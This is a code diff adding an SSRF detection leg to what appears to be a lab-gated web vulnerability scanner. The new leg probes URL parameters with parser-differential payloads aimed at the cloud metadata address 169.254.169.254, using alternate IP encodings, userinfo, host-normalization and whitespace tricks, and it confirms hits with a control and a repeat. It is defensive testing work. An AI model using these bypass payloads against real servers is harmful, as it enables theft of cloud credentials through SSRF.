@@ -371,6 +371,10 @@ export async function probeSsrf(url, params, opts = {}) {
     }
   }
 
+  // ---- Parser differentials (#469) ---------------------------------------
+  // SSRF via URL parser differentials (see probeSsrfParserDifferentials
+  // below): runs right after the plain metadata leg, before the blind leg.
+  findings.push(...(await probeSsrfParserDifferentials(url, params, opts)));
   // ---- Blind leg — collaborator canary + control (rows #237 / #311) ------
   // Needs the collaborator seam; without it the leg is skipped,
   // never guessed at. Lab-gated twice: the wiring starts the
@@ -752,6 +756,159 @@ export async function probeSsrf(url, params, opts = {}) {
         /* ignore */
       }
     }
+  }
+  return findings;
+}
+
+
+// --- SSRF via URL parser differentials (coverage row #469) -----------------
+// A server that validates a URL with one parser and fetches it with
+// another can be tricked into fetching an internal host the validator
+// thought was external. The four families below are the cases where
+// Node's WHATWG URL parser (the fetcher model) normalizes an attacker
+// string to the metadata host while a naive validator — plain-regex
+// host extraction + exact-literal blocklist — approves it. Verified
+// empirically on Node 24 (see ssrf.test.js SSRF-469-1).
+//
+// ORACLE (differential, all three required):
+//   (1) CONTROL — the plain metadata URL must NOT return fetched
+//       metadata. If it does, the target blocks nothing and the
+//       differential is meaningless (the plain metadata leg above
+//       already covers that target).
+//   (2) PAYLOAD + REPEAT — an ambiguous payload must return fetched
+//       metadata (fetchedMetadataMarker — the same value-shaped bar
+//       as the plain leg, never a bare word) twice in a row.
+//   (3) A single-parse fetch that merely returns data never
+//       confirms; neither does a payload whose repeat does not
+//       reproduce.
+// One finding per parameter (first confirming family wins), class
+// 'ssrf_parser_differential', HIGH — the fetch is confirmed, but the
+// parser path is implementation-specific, so it ranks below the
+// direct critical metadata leg. The control re-sends the plain
+// metadata URL (one extra request per parameter) so the differential
+// is self-contained and does not depend on the plain leg's result.
+//
+// INVESTIGATED AND NOT LEGS (empirically rejected on Node 24):
+//   - backslash in authority: `http://trusted.example\@169.../`
+//     parses under WHATWG to host trusted.example (the backslash
+//     terminates the authority); the reverse
+//     `http://169...\@trusted.example/` contains the blocked
+//     literal. No WHATWG-fetcher differential exists for backslash.
+//   - overlong UTF-8 in host (`%C0%AE` for '.'): `new URL()`
+//     throws Invalid URL — no parse, no fetch.
+//   - scheme-relative (`//169.../`): `new URL()` throws without a
+//     base — a server-side fetcher has no base to resolve against.
+//   - `http:169.../` (no slashes): WHATWG does parse it to the
+//     metadata host, but a validator must FAIL OPEN on the missing
+//     `//` for any differential to exist — too weak an assumption
+//     to confirm on.
+//   - fragment (`http://trusted.example#@169.../`): the fragment is
+//     never fetched by any parser.
+//
+// GATES: lab only. `opts.allowWrite !== true` (the value runScan
+// sets solely for lab targets via isLabTargetHost) returns [] without
+// a single request. No labCreds are needed: the sink is an
+// unauthenticated URL parameter, like the plain metadata leg.
+// A validator that normalizes (WHATWG parse + IP canonicalization)
+// is NOT bypassed by these payloads — that is the honest limit.
+const PARSER_DIFFERENTIAL_FAMILIES = [
+  {
+    variant: 'alt-ip',
+    payloads: [
+      'http://0xA9FEA9FE/latest/meta-data/',
+      'http://0xA9.0xFE.0xA9.0xFE/latest/meta-data/',
+      'http://2852039166/latest/meta-data/',
+      'http://0251.0376.0251.0376/latest/meta-data/',
+    ],
+  },
+  {
+    variant: 'userinfo',
+    payloads: [
+      'http://trusted.example@169.254.169.254/latest/meta-data/',
+      'http://trusted.example:80@169.254.169.254/latest/meta-data/',
+    ],
+  },
+  {
+    variant: 'host-normalization',
+    payloads: [
+      'http://169.254.169.254./latest/meta-data/',
+      'http://169。254。169。254/latest/meta-data/',
+      'http://169.254.169.254%E3%80%82/latest/meta-data/',
+    ],
+  },
+  {
+    variant: 'whitespace-trim',
+    payloads: [
+      'http://169.254.169.254\t/latest/meta-data/',
+      'http://169.254\t.169.254/latest/meta-data/',
+    ],
+  },
+];
+
+export async function probeSsrfParserDifferentials(url, params, opts = {}) {
+  // LAB GATE: allowWrite is the value runScan sets solely for lab
+  // targets (isLabTargetHost). Anywhere else, silent [] — no request.
+  if (!opts || opts.allowWrite !== true) return [];
+  const findings = [];
+  const candidates = params.filter((p) => URL_PARAM_RE.test(probePointName(p)));
+  for (const param of candidates.slice(0, 5)) {
+    // (1) CONTROL — the plain metadata URL must be refused (no
+    // fetched-metadata marker). An open control means the target
+    // blocks nothing; the plain metadata leg already covers it.
+    const controlUrl = mutateUrl(url, param, METADATA_URL);
+    let controlBody;
+    try {
+      controlBody = await get(controlUrl, opts);
+    } catch {
+      continue; // control inconclusive — no differential without it
+    }
+    if (fetchedMetadataMarker(controlBody, controlUrl)) continue;
+    // (2) PAYLOAD + REPEAT, family by family, payload by payload.
+    let confirmed = null;
+    for (const family of PARSER_DIFFERENTIAL_FAMILIES) {
+      for (const payload of family.payloads) {
+        const sentUrl = mutateUrl(url, param, payload);
+        let body;
+        try {
+          body = await get(sentUrl, opts);
+        } catch {
+          continue;
+        }
+        const hit = fetchedMetadataMarker(body, sentUrl);
+        if (!hit) continue;
+        // Repeat the same payload once — a single divergent response
+        // is jitter, not a finding.
+        let repeatBody;
+        try {
+          repeatBody = await get(sentUrl, opts);
+        } catch {
+          continue;
+        }
+        if (!fetchedMetadataMarker(repeatBody, sentUrl)) continue;
+        confirmed = { family: family.variant, payload, sentUrl, hit };
+        break;
+      }
+      if (confirmed) break;
+    }
+    if (!confirmed) continue;
+    const idx = confirmed.hit.clean.indexOf(confirmed.hit.marker);
+    const window = confirmed.hit.clean.slice(Math.max(0, idx - 60), idx + 120);
+    findings.push({
+      class: 'ssrf_parser_differential',
+      id: `ssrf-parser-differential-${probePointName(param)}-${confirmed.family}`,
+      title: `SSRF via URL parser differential in parameter '${probePointParameter(param)}' — ${confirmed.family} reaches cloud metadata`,
+      severity: 'high',
+      url,
+      param: probePointParameter(param),
+      evidence: {
+        request: `GET ${confirmed.sentUrl}`,
+        response: `cloud metadata marker in the response — "...${window}..."`,
+        impact_demo: `the server-side fetcher parsed the ${confirmed.family} URL as 169.254.169.254 while the validator approved it; control (plain metadata URL) was refused and the payload reproduced on repeat`,
+        variant: confirmed.family,
+        coverageRow: 469,
+        oobHit: true,
+      },
+    });
   }
   return findings;
 }
